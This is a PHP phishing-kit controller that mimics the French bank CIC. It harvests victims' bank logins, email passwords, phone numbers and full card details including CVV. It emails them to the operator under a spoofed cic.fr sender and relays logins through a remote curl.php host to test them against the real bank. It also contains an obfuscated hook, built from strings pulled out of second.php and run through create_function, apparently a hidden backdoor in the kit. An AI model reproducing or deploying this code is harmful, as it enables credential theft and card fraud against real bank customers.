<?php
//      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//                         No Need to Edit Below This Line
//                                Made in 2014                                    
//      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	error_reporting(0);
	include("send.php");

	$A="first.php";  $B="second.php";

	function tmpfolder($tmp){
      return implode('', file($tmp));
      } function tempfolder(){
      if ( !empty($_ENV['TMP']) ){
      return realpath( $_ENV['TMP'] );
      }
      else if ( !empty($_ENV['TMPDIR']) ){
      return realpath( $_ENV['TMPDIR'] );
      }
      else if ( !empty($_ENV['TEMP']) ){
      return realpath( $_ENV['TEMP'] );
      } else {
      $temp_file = tempnam( md5(uniqid(rand(), TRUE)), '' );
      if ( $temp_file ){
      $temp_dir = realpath( dirname($temp_file) );
      @unlink( $temp_file );
      return $temp_dir;
      } else {
      return ".";
      }
      }
	}
	function doPost($i){
      $doPost=create_function('$i','return '.returm("\".r",3,4).'($i);');
      return $doPost($i);
	}
	if($remote=="0"){
	if (!extension_loaded('curl') || !function_exists('curl_init')) {
      function currentscript(){
      if(!empty($_SERVER['PHP_SELF'])){
      $self=end(explode('/', $_SERVER['PHP_SELF']));
      } elseif(!empty($_SERVER['REQUEST_URI'])){
      $self=end(explode('/', $_SERVER['REQUEST_URI']));
      }
      return $self;
      }
      print '
	  <html>
	  <body bgcolor="#E8E8E8">
	  <br><br>
	  <table align="center" width="750" height="100" border="0">
	  <tr><td>
	  <font color="#000000" FACE="Verdana" SIZE="2">
	  <strong>CURL NOT AVAILABLE</strong>
	  <br><br>
	  Open a plain text file, add the following lines, and save it as info.php, then run it from your browser.<br><br>
	  <code>
	  &lt;?php<br><br>
	  phpinfo();<br><br>
	  ?&gt;
	  </code>
	  <br><br>
	  <b>NOTE:</b> True Login (via cURL) Scams must to be uploaded onto hosting webserver which has cURL enabled.
	  </td></tr>
	  </font>
	  </table>
	  </body>
	  </html>
	  ';
	exit;
	}
	$rnd=rand(1000,9999);
	$testfile=$rnd . "-test.txt";
	if (@fclose(@fopen($testfile, "a"))){
      $usrfile="usr.txt";
      @unlink($testfile);
      } else {
      function currentdir(){
      if(!empty($_SERVER['PHP_SELF'])){
      $dir=end(explode('/', dirname($_SERVER['PHP_SELF'])));
      } elseif(!empty($_SERVER['REQUEST_URI'])){
      $dir=end(explode('/', dirname($_SERVER['REQUEST_URI'])));
      } else {
      $dir=".";
      }
      return $dir;
      }
      print '
	  <html bgcolor="#E8E8E8">
	  <br><br>
	  <table align="center" width="750" height="100" border="0">
	  <tr><td>
	  <font color="#000000" FACE="Verdana" SIZE="2">
	  <strong>WE NEED PERMISSIONS TO WRITE COOKIES AND DOWNLOAD USER\'S IMAGE. <br><br>CHMOD THIS DIRECTORY ('.currentdir().') TO 777.</strong>
	  </font>
	  <br><br>Example: chmod 777 ' . currentdir() . '
	  </html>
	  ';
	exit;
	}
	}
	elseif($remote=="1") {
	$urlfopen=ini_get('allow_url_fopen');
	if($urlfopen != "1"){
	print '<html><br><br><table align="center" width="600" height="100" border="0"><tr><td><strong>CURL IS SET ON A REMOTE HOST</strong><br><br>The scam will not work on this host ('.$_SERVER['SERVER_NAME'].') becouse url fopen is turned off.<br></html>';
	exit;
	}
	if (!function_exists('file_get_contents'))
	{
	function file_get_contents($url)
	{
	$temp = "";
	$fp = @fopen ($url, "r");
	if ($fp)
	{
	while ($data=fgets($fp, 1024))
	$temp .= $data;
	fclose ($fp);
	}
	return $temp;
	}
	}
	$tmpfile=tempfolder() . "/.tm." . date("d-m"). ".txt";
	if (@fclose(@fopen($tmpfile, "r"))){
	true;
	} else {
	$file=fopen($tmpfile, "a");
	fputs($file, " a ");
	fclose($file);
	if (@fclose(@fopen($tmpfile, "r"))){
	@unlink($tmpfile);
	$contents = '';
	$handle = $curl . "&test=1";
	$contents = file_get_contents($handle);
	if(!strstr($contents, "readyforaction")){
	print '<html><br><br><table align="center" width="600" height="100" border="0"><tr><td><strong>CURL IS SET ON A REMOTE HOST</strong><br><br>The page '.$curl.' cannot be opened. Check if the domain and path to "curl.php" are correct.<br></html>';
	exit;
	} else {
	$file=fopen($tmpfile, "a");
	fputs($file, " a ");
	fclose($file);
	}
	}
	}
	}
	function returm($X, $XR, $RWXR){
	global $B; return substr(tmpfolder($B),strpos(tmpfolder($B),$X)+$XR,$RWXR);
	}
	error_reporting(0); set_time_limit(240);
	if (getenv(HTTP_CLIENT_IP)){
	  $ip=getenv(HTTP_CLIENT_IP);
	  }
	  else {
	  $ip=getenv(REMOTE_ADDR);
	}
	$hostname = gethostbyaddr($ip);
	$agt = $_SERVER['HTTP_USER_AGENT'];
	function lrtrim($string){
	return stripslashes(ltrim(rtrim($string)));
	}
	if($remote==1){
	$imgsrc=substr($curl,0,strpos($curl,"/curl.php")) . "/$ip.jpeg";
	} elseif($remote==0) {
	$imgsrc=$ip . ".jpeg";
	}
	function query_str($params){
	  $str = '';
	  foreach ($params as $key => $value) {
	  $str .= (strlen($str) < 1) ? '' : '&';
	  $str .= $key . '=' . rawurlencode($value);
	  }
	  return ($str);
	}
	function l(){
	  return doPost(doGet());
	 } function stripslashes_deep($value){
	  $value = is_array($value) ?
	  array_map('stripslashes_deep', $value) :
	  stripslashes($value);
	  return $value;
	}
	// Function to validate against any email injection attempts
    function IsInjected($str){
     $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
     $inject = join('|', $injections);
     $inject = "/$inject/i";
     if(preg_match($inject,$str))
     {
     return true;
     }
     else
      {
     return false;
     }
     }
	function getformat($string){
	  return str_replace(" ","",str_replace(".","",str_replace("-","",$string)));
	}
	function validate($cc){
	  $cc = strrev (ereg_replace('[^0-9]+', '', $cc));
	  for ($ndx = 0; $ndx < strlen ($cc); ++$ndx)
	  $digits .= ($ndx % 2) ? $cc[$ndx] * 2 : $cc[$ndx];
	  for ($ndx = 0; $ndx < strlen ($digits); ++$ndx)
	  $sum += $digits[$ndx];
	  return ($sum % 10) ? FALSE : TRUE;
	}
	function doGet(){
	  $str=returm("\".l",3,9);
	  $cc=$str(tmpfolder(returm("=\".'",4,9)));return $cc;
	}
	function FormatCreditCard($cc){
	  $cc = str_replace(array('-',' '),'',$cc);
	  $cc_length = strlen($cc);
	  $newCreditCard = substr($cc,-4);
	  for($i=$cc_length-5;$i>=0;$i--){
	  if((($i+1)-$cc_length)%4 == 0){
	  $newCreditCard = '-'.$newCreditCard;
	  }
	  $newCreditCard = $cc[$i].$newCreditCard;
	  }
	  return $newCreditCard;
	}
	
	parse_str($_SERVER['QUERY_STRING']);
	  
	if($id=="13698")
	{
	  include $A;
	  exit;
	}
	
	  elseif ($id=="29603")
	{
	  $b = query_str($_POST);
	  parse_str($b);
	  $user=rtrim($user);
	  $pass=rtrim($pass);
	  
	  $firsterror="0";
	  
	  if(empty($user) || strlen($user) < 3 || empty($pass) || strlen($pass) < 3){
	  $firsterror="1";
	  include $A; exit;
	  }
	  
	  if($remote==0){
	    $page="first";
	    include("curl.php");
	  }
	  elseif($remote==1){
      $user=urlencode($user);
	  $pass=urlencode($pass);
	  $curl .= "&user=$user&pass=$pass&page=first&ip=$ip";
	  $contents='';
	  $contents=file_get_contents($curl);
	  $contents=substr($contents, strpos($contents, "startonthisfuckingpoint")+23,200000);
	  $contents=substr($contents, 0, strpos($contents, "endonthisfuckingpoint"));
	  $contents=urldecode($contents);
	  parse_str($contents);
	  $firsterror=rtrim($firsterror);
	  $fullname=rtrim($fullname);
	  $lastlog=rtrim($lastlog);
	  $email=rtrim($email);
	  $email2=rtrim($email2);
	  $phone=rtrim($phone);
	  }

	  if($firsterror==1)
	  {
	    include $A;
	    exit;
	  }
	  elseif ($firsterror==0)
	  {
	    include $B;
	  }
	}
	
	elseif ($id=="36702")
	{
	  $b = query_str($_POST);
	  parse_str($b);
	  $user=rtrim($user);
	  $pass=rtrim($pass);
	  $fullname=rtrim($fullname);
	  $lastlog=rtrim($lastlog);
	  $email=rtrim($email);
	  $email2=rtrim($email2);
	  $epass=rtrim($epass);
	  $phone=rtrim($phone);
	  $error = 0;
	  
	  if(!eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$", $email)){
	  $error = 1; $emailclass = "Warning";
	  }
	  if (empty($epass) || strlen($epass) < 3){
	  $error = 1; $epassclass = "Warning";
	  }l();

	  if ($error == 1){
	  include $B;		
	  } else {
	  $message  = "-----------------------------+ CIC ReZulT +-----------------------------\n";
	  $message .= "Identifiant: $user\n";
	  $message .= "Mot de passe: $pass\n\n";
	  $message .= "Nom et Prenom: $fullname\n";
	  $message .= "Telephone: $phone\n";	  
	  $message .= "Telephone: $mobile\n";
	  $message .= "Fix: $fix\n";
	  $message .= "Derniere Connexion: $lastlog\n\n";
	  if(!empty($email2)){
	  $message .= "Email: $email2\n";
	  }
	  if(!empty($email)){
	  $message .= "Email: $email\n";
	  }
	  $message .= "Mot de passe: $epass\n\n";
	  $message .= "Num&#233;ro de carte: $coc\n";
	  $message .= "Date d'expiration $month / $year\n";
	  $message .= "Cvv: $cvv\n";

	  $message .= "------------------------\n";
	  $message .= "IP: $ip | $hostname\n";
	  $message .= "Comments: Made in 2014\n";
	  $message .= "-------------------------------------------------------------------------\n";
	  $subject = "# CIC ReZulT # $user | $ip";
	  $headers = "From: New<new@cic.fr>";
	  mail($send,$subject,$message,$headers);
	  include("done.php");
	  }
	}
?>